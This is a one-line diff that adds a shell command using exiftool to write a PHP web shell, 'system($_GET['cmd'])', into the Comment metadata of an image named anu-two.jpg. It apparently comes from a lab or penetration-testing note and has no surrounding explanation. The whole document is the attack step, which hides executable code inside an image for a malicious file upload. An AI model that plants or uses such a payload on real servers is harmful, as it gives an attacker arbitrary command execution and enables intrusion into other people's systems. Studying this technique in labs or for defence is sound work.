@@ -1,0 +1,1 @@
+exiftool -Comment="<?php system($_GET['cmd']); ?>" anu-two.jpg
